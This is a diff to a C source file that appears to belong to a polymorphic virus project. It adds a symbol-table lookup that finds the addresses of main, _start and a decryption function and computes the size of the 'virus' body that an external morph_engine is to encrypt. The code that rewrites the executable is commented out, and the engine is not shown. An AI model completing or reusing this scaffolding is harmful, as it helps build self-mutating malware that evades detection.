@@ -6,6 +6,8 @@
 #include <unistd.h>
 #include <bfd.h>
 
+extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
+
 typedef struct node {
   const char* name;
   unsigned int vma;
@@ -44,49 +46,127 @@ char* tostring(int val, char* buf, int base) {
 	return str;
 }
 
-// Function to space columns depending on width of specified column
-void print_offset(const char* str, int offset) {
-	char space[1] = {" "};
-	int i;
-	for (i = 0; i < (offset - strlen(str)); i++) {
-		write(1, space, 1);
-	}
-}
 
+char* getaddress(char *filename, char*symbol){
 
-
-int polymorphicengine(int argc, char* argv[])
-{
-      int i;
-      for (i=0; i<argc; ++i) {
-      printf("argv[%d]=%s\n", i, argv[i]);
-      }
-
-
-	// Filename cmd line arg
-	char *filename = argv[0];
 	// Call library function to get a pointer to a ll
 	sym * head = getsymtable(filename);
 	// Recursively iterate through ll and print to std out
 	sym * current = head;
-	// Print header
-	const char* header = "Name                                              VMA\n";
-	write(1, header, strlen(header));
 	while (current != NULL) {
 		char newline[1] = {"\n"};
 		char* buffer = malloc(32 * sizeof(char));
 
-		write(1, current->name, strlen(current->name));
-		print_offset(current->name, 50);
-
-		char* vma = tostring(current->vma, buffer, 16);
-		write(1, vma, strlen(vma));
-		write(1, newline, 1);
-
+            if(strcmp(symbol, current->name)==0){
+                  char* vma = tostring(current->vma, buffer, 16);
+                  return vma;
+            }
 		free(buffer);
 		current = current -> next;
 	}
+}
+
+int polymorphicengine(int argc, char* argv[])
+{
+      // int i;
+      // for (i=0; i<argc; ++i) {
+      // printf("argv[%d]=%s\n", i, argv[i]);
+      // }
+
+      char main[]="main";
+      char start[]="_start";
+      char decryption[]="decrypt.decryption_function";
+      
+      write(1, getaddress(argv[0], main), strlen(getaddress(argv[0], main)));
+      printf("\n");
+      write(1, getaddress(argv[0], start), strlen(getaddress(argv[0], start)));
+      printf("\n");
+      write(1, getaddress(argv[0], decryption), strlen(getaddress(argv[0], decryption)));
+      printf("\n");
+
+	// // to get offset just delete the most significant char
+
+      char *main_offset = getaddress(argv[0], "main") + 1;
+      char *start_offset = getaddress(argv[0], "_start") + 1;
+      char *decryption_offset = getaddress(argv[0], "decrypt.decryption_function") + 1;
+
+      // write(1, main_offset, strlen(main_offset));
+
+      const size_t virus_instruction_begin  = (int)strtol(main_offset, NULL, 16);
+	size_t virus_encrypt_size    = strtoull(start_offset, NULL, 16);
+      
+      // calculate the payload size
+      virus_encrypt_size = virus_encrypt_size - virus_instruction_begin;
+
+	const size_t virus_decrypt_offset  = strtoull(decryption_offset, NULL, 16);
+
+      printf("%ul\n", virus_instruction_begin);
+      printf("%ul\n", virus_encrypt_size);
+      printf("%ul\n", virus_decrypt_offset);
+
+      // // open the executable file
+	// FILE* exe_file = fopen(argv[0], "rb");
+	// if(!exe_file)
+	// {
+	// 	printf("Failed to open %s\n", argv[0]);
+	// 	return -1;
+	// }
+
+	// // get the size of the executable file
+	// size_t exe_size;
+	// fseek(exe_file, 0, SEEK_END);
+	// exe_size = ftell(exe_file);
+	// rewind(exe_file);
+
+	// // allocate the data
+	// char* exe_data = malloc(exe_size);
+	// if(!exe_data)
+	// {
+	// 	fclose(exe_file);
+	// 	printf("Executable data allocation failed\n");
+	// 	return 1;
+	// }
+
+	// // read the entire executable file
+	// if(!fread(exe_data, exe_size, 1, exe_file))
+	// {
+	// 	fclose(exe_file);
+	// 	printf("Executable file read failed\n");
+	// 	goto quit;
+	// }
+
+	// // close the file
+	// fclose(exe_file);
 
 
+
+	// // call the polymorphic engine
+	// // if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
+	// // {
+	// // 	printf("An error occured in the polymorphic engine\n");
+	// // 	goto quit;
+	// // }
+
+	// // initialize the output filename
+	// char out_filename[FILENAME_MAX];
+	// snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
+
+	// // open the output file
+	// FILE* out_file = fopen(out_filename, "wb");
+	// if(!out_file)
+	// {
+	// 	printf("failed to open %s\n", out_filename);
+	// 	goto quit;
+	// }
+
+	// // write the modified executable data
+	// if(!fwrite(exe_data, exe_size, 1, out_file))
+	// {
+	// 	printf("failed to write into %s\n", out_filename);
+	// }
+
+      // quit:
+      //       free(exe_data);
       return 0;
+
 }
